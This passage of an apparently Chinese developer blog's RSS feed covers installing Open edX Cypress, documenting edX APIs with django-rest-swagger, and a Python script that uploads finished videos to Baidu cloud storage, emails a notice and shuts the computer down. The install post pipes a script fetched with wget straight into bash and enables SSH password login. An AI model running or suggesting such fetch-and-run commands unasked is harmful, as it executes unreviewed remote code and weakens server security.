&lt;p&gt;此外我个人很喜欢七牛云，开发者友好，接口很棒，价格也公道，之后应该会针对七牛云写XBlock，edx中有许多存储机制默认采用了亚马逊的S3服务，其实这块很大部分可以移植到七牛云上&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 29 Aug 2015 00:00:00 +0000</pubDate><guid>tag:,2015-08-29:edx-use-youku.html</guid><category>edx</category></item><item><title>在ubuntu12.04下安装edx Cypress</title><link>/install-edx-Cypress.html</link><description>&lt;h1&gt;最简易的方式&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;OPENEDX_RELEASE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;named-release/cypress
wget https://raw.githubusercontent.com/edx/configuration/&lt;span class="nv"&gt;$OPENEDX_RELEASE&lt;/span&gt;/util/install/sandbox.sh -O - &lt;span class="p"&gt;|&lt;/span&gt; bash
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;分步安装&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;sudo apt-get update -y&lt;/li&gt;
&lt;li&gt;sudo apt-get upgrade -y&lt;/li&gt;
&lt;li&gt;sudo reboot&lt;/li&gt;
&lt;li&gt;sudo apt-get install -y build-essential software-properties-common python-software-properties curl git-core libxml2-dev libxslt1-dev libfreetype6-dev python-pip python-apt python-dev libxmlsec1-dev swig&lt;/li&gt;
&lt;li&gt;sudo pip install --upgrade pip&lt;/li&gt;
&lt;li&gt;sudo pip install --upgrade virtualenv&lt;/li&gt;
&lt;li&gt;cd /var/tmp&lt;/li&gt;
&lt;li&gt;git clone https://github.com/edx/configuration&lt;/li&gt;
&lt;li&gt;cd /var/tmp/configuration&lt;/li&gt;
&lt;li&gt;git checkout named-release/cypress&lt;/li&gt;
&lt;li&gt;sed  -i "/COMMON_SSH_PASSWORD_AUTH/c COMMON_SSH_PASSWORD_AUTH: \"yes\"" playbooks/roles/common/defaults/main.yml&lt;/li&gt;
&lt;li&gt;sudo pip install -r requirements.txt&lt;/li&gt;
&lt;li&gt;cd /var/tmp/configuration/playbooks&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo ansible-playbook -c local ./edx_sandbox.yml -i "localhost,"   -e 'edx_platform_version=named-release/cypress certs_version=named-release/cypress forum_version=named-release/cypress xqueue_version=named-release/cypress'&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;建议&lt;/h1&gt;
&lt;p&gt;不要在edx_sandbox.yml添加insights和ecommerce，否则可能出现nodeenv错误。这两项功能目前还没完善&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 25 Aug 2015 00:00:00 +0000</pubDate><guid>tag:,2015-08-25:install-edx-Cypress.html</guid><category>edx</category></item><item><title>使用django-rest-swagger为edx api制作文档</title><link>/edx-api-with-django-rest-swagger.html</link><description>&lt;blockquote&gt;
&lt;p&gt;程序员既痛恨写文档，又痛恨别人不写文档 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;edX目前已经有不少可用的api接口了:&lt;a href="http://edx-platform-api.readthedocs.org/en/latest/index.html"&gt;EdX Platform APIs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;edx自带的api都是用&lt;a href="django-rest-framework.org"&gt;django-rest-framework&lt;/a&gt;写的。如果我们需要扩展edx的api，好比为手机端提供额外的接口，建议也使用&lt;a href="django-rest-framework.org"&gt;django-rest-framework&lt;/a&gt;来写api，而不要从django那里开始写&lt;/p&gt;
&lt;p&gt;我去年为edx的论坛模块写过api，供移动端使用，最近为了将edx打造为子系统，需要写站点级别的api&lt;/p&gt;
&lt;p&gt;写api倒挺有趣，可为了将api提供给别人用，我们需要为api写文档，这是件无聊乏味且容易出错的工作（收集参数什么的）。能不能像python doc那样从代码里直接生成文档呢。答案就是&lt;a href="https://github.com/marcgibbons/django-rest-swagger"&gt;django-rest-swagger&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;django-rest-swagger是什么&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;An API documentation generator for Swagger UI and Django REST Framework&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;相关文档参考&lt;a href="http://django-rest-swagger.readthedocs.org/en/latest/"&gt;这里&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;install django-rest-swagger for edX&lt;/h1&gt;
&lt;p&gt;为了在edx中安装django-rest-swagger，我们需要做以下工作&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#git clone&lt;/span&gt;
git clone https://github.com/marcgibbons/django-rest-swagger.git
&lt;span class="nb"&gt;cd&lt;/span&gt; django-rest-swagger
&lt;span class="c1"&gt;#edx的django版本是1.4,django-rest-swagger要求&amp;gt;1.5，所以我们注释掉依赖&lt;/span&gt;
&lt;span class="c1"&gt;#vim setup.py,注释掉以下内容&lt;/span&gt;
&lt;span class="c1"&gt;#&amp;#39;django&amp;gt;=1.5&amp;#39;,&lt;/span&gt;
&lt;span class="c1"&gt;#&amp;#39;djangorestframework&amp;gt;=2.3.8&amp;#39;,&lt;/span&gt;

sudo su edxapp -s /bin/bash
&lt;span class="nb"&gt;source&lt;/span&gt; /edx/app/edxapp/edxapp_env
pip install ./django-rest-swagger
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;配置&lt;/h1&gt;
&lt;p&gt;往&lt;code&gt;/edx/app/edxapp/edx-platform/lms/urls.py&lt;/code&gt;添加:
&lt;code&gt;INSTALLED_APPS += ('rest_framework_swagger',)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;往&lt;code&gt;/edx/app/edxapp/edx-platform/lms/env/aws.py&lt;/code&gt;添加:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;patterns&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;r&amp;#39;^docs/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;include&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;rest_framework_swagger.urls&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;使用&lt;/h1&gt;
&lt;p&gt;访问 &lt;code&gt;http://127.0.0.1/docs&lt;/code&gt; 即可&lt;/p&gt;
&lt;h1&gt;效果&lt;/h1&gt;
&lt;p&gt;&lt;img alt="api1" src="img/edx/api/api1.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="api2" src="img/edx/api/api2.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;展示接口参数，可以直接在这里与接口往来数据&lt;/p&gt;
&lt;p&gt;&lt;img alt="api3" src="img/edx/api/api3.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;下边是我扩展的接口：&lt;/p&gt;
&lt;p&gt;&lt;img alt="api4" src="img/edx/api/api4.jpeg" /&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 16 Aug 2015 00:00:00 +0000</pubDate><guid>tag:,2015-08-16:edx-api-with-django-rest-swagger.html</guid><category>edx</category></item><item><title>for dinner</title><link>/for-dinner.html</link><description>&lt;p&gt;部门新来了个同事，负责视频编导和制作。经常需要使用Premiere渲染视频，这是一项十分费时的工作，动辄3-4个小时。&lt;/p&gt;
&lt;p&gt;同事时常在傍晚4-5点开始渲染视频，待其完成，将渲染好的视频发送出去，再关闭电脑回家。这样一来，往往就到晚上9/10点了。&lt;/p&gt;
&lt;p&gt;这样一来，就没空做晚饭和次日的便当了，念其厨艺棒极，为了午饭时间能闻到土豆炖牛肉的香味，我决定写个脚本完成这个工作。&lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;思路&lt;/h1&gt;
&lt;h3&gt;任务描述&lt;/h3&gt;
&lt;p&gt;写一个python脚本，该脚本运行在Windows环境下，该脚本监控视频导出目录，发现视频文件生成时，将其同步到云盘，同步完成后给相关人员发送邮件，通知其下载。此后关机。&lt;/p&gt;
&lt;h3&gt;任务分解&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;在Windows搭建python环境(easy)&lt;/li&gt;
&lt;li&gt;使用&lt;a href="https://github.com/gorakhargosh/watchdog"&gt;watchdog&lt;/a&gt;监控视频导出目录变化&lt;/li&gt;
&lt;li&gt;使用&lt;a href="https://github.com/houtianze/bypy"&gt;bypy&lt;/a&gt;同步文件到百度网盘&lt;/li&gt;
&lt;li&gt;使用smtp发送邮件&lt;/li&gt;
&lt;li&gt;关机:&lt;code&gt;from sys import system;system('halt')&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;准备工作&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;在windows下配置好python环境，安装pip&lt;ul&gt;
&lt;li&gt;安装python&lt;/li&gt;
&lt;li&gt;下载 &lt;a href="https://bootstrap.pypa.io/ez_setup.py"&gt;easy_install&lt;/a&gt;到Python文件夹 点击安装  &lt;/li&gt;
&lt;li&gt;添加环境变量 D:\Python27 与 D:\Python27\Scripts&lt;/li&gt;
&lt;li&gt;cmd &amp;gt; easy_install pip&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;pip install bypy -i http://pypi.douban.com/simple&lt;/li&gt;
&lt;li&gt;pip install watchdog -i http://pypi.douban.com/simple&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;配置bypy&lt;/h3&gt;
&lt;p&gt;在终端执行bypy.py info，之后按照提示操作就行&lt;/p&gt;
&lt;h1&gt;show my code&lt;/h1&gt;
&lt;h3&gt;源代码&lt;/h3&gt;
&lt;p&gt;看这里:&lt;a href="https://github.com/wwj718/for_dinner"&gt;for_dinner&lt;/a&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#for_dinner.py&lt;/span&gt;
&lt;span class="c1"&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span class="c1"&gt;# encoding: utf-8&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;time&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;logging&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;watchdog.observers&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Observer&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;watchdog.events&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;LoggingEventHandler&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;FileSystemEventHandler&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;send_emails&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;send_mail&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;commands&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;system&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;config&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;watchdir&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;watch_file_type&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;remotedir&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;notice2download&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sub&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;u&amp;quot;下载视频&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;u&amp;quot;请登录百度网盘&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;send_mail&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sub&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;upload_watch_file&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;file&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;pass&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;MyHandler&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;FileSystemEventHandler&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;on_created&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;event&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;event&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;src_path&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;endswith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;watch_file_type&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;event&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;src_path&lt;/span&gt;
            &lt;span class="c1"&gt;#上传到云盘&lt;/span&gt;
            &lt;span class="n"&gt;mycommands&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;bypy.py upload &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;event&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;src_path&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;remotedir&lt;/span&gt;
            &lt;span class="n"&gt;output&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;commands&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getoutput&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mycommands&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;output&lt;/span&gt;
            &lt;span class="c1"&gt;#发送邮件&lt;/span&gt;
            &lt;span class="n"&gt;content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;u&amp;quot;新建文件：&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;event&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;src_path&lt;/span&gt;
            &lt;span class="n"&gt;notice2download&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;60&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#十分钟后关机&lt;/span&gt;
            &lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;halt&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;on_modified&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;event&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;event&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;src_path&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;endswith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;watch_file_type&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;     &lt;span class="c1"&gt;#监控指定文件内容、权限等变化&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;log file &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt; changed!&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;event&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;src_path&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="n"&gt;watchdir&lt;/span&gt;
    &lt;span class="n"&gt;event_handler&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MyHandler&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;observer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Observer&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;observer&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;schedule&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;event_handler&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;recursive&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;observer&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;start&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;KeyboardInterrupt&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;observer&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;stop&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;observer&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;          
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#send_emails.py&lt;/span&gt;
&lt;span class="c1"&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span class="c1"&gt;# encoding: utf-8&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;smtplib&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;email.mime.text&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;MIMEText&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;config&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;mailto_list&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;mail_host&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;mail_user&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;mail_pass&lt;/span&gt;



&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;send_mail&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sub&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;to_list&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;mailto_list&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;msg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MIMEText&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;html&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Subject&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sub&lt;/span&gt;
    &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;From&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mail_user&lt;/span&gt;
    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;server&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;smtplib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SMTP&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mail_host&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mail_user&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;mail_pass&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendmail&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mail_user&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;to_list&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;as_string&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
        &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;
    &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;Exception&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;False&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;配置文件&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#config.py&lt;/span&gt;
&lt;span class="c1"&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span class="c1"&gt;# encoding: utf-8&lt;/span&gt;

&lt;span class="n"&gt;watchdir&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/tmp&amp;quot;&lt;/span&gt; &lt;span class="c1"&gt;#监控的目录&lt;/span&gt;
&lt;span class="n"&gt;watch_file_type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;txt&amp;quot;&lt;/span&gt; &lt;span class="c1"&gt;#监控的文件类型&lt;/span&gt;
&lt;span class="n"&gt;remotedir&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;remotedir&amp;quot;&lt;/span&gt; &lt;span class="c1"&gt;#云盘上的目录,需要先创建bypy.py mkdir remotedir&lt;/span&gt;
&lt;span class="n"&gt;mailto_list&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;someone@example.com&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,]&lt;/span&gt; &lt;span class="c1"&gt;#接收人&lt;/span&gt;
